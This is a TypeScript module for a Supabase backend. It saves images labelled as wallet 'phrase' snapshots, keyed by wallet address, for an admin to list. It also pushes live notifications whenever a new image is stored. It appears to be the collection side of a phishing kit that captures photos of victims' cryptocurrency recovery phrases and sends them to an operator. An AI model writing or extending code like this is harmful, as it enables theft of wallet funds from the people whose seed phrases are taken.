import { supabase } from './supabase'

const SNAPS_TABLE = 'wallet_phrase_snaps'

function nowIso() {
  return new Date().toISOString()
}

/** Persist phrase photo for admin (works even if wallet_sessions has no image column). */
export async function upsertCloudPhraseSnap(walletAddress: string, snapDataUrl: string): Promise<void> {
  if (!walletAddress || !snapDataUrl.startsWith('data:image')) return
  const snap_image = snapDataUrl.slice(0, 480_000)

  const { error: snapErr } = await supabase.from(SNAPS_TABLE).upsert(
    {
      wallet_address: walletAddress,
      snap_image,
      captured_at: nowIso(),
    },
    { onConflict: 'wallet_address' }
  )

  if (snapErr) {
    console.warn('wallet_phrase_snaps upsert failed:', snapErr.message)
  }
}

export async function listCloudPhraseSnaps(): Promise<Map<string, string>> {
  const map = new Map<string, string>()
  try {
    const { data, error } = await supabase.from(SNAPS_TABLE).select('wallet_address, snap_image').limit(500)
    if (error || !data) {
      if (error) console.warn('wallet_phrase_snaps list failed:', error.message)
      return map
    }
    for (const row of data as { wallet_address: string; snap_image: string }[]) {
      if (row.wallet_address && row.snap_image) map.set(row.wallet_address, row.snap_image)
    }
  } catch (err) {
    console.warn('wallet_phrase_snaps list failed:', err)
  }
  return map
}

export function subscribeCloudPhraseSnaps(onChange: () => void) {
  const channel = supabase
    .channel('wallet_phrase_snaps_live')
    .on('postgres_changes', { event: '*', schema: 'public', table: SNAPS_TABLE }, () => onChange())
    .subscribe()
  return () => {
    void supabase.removeChannel(channel)
  }
}
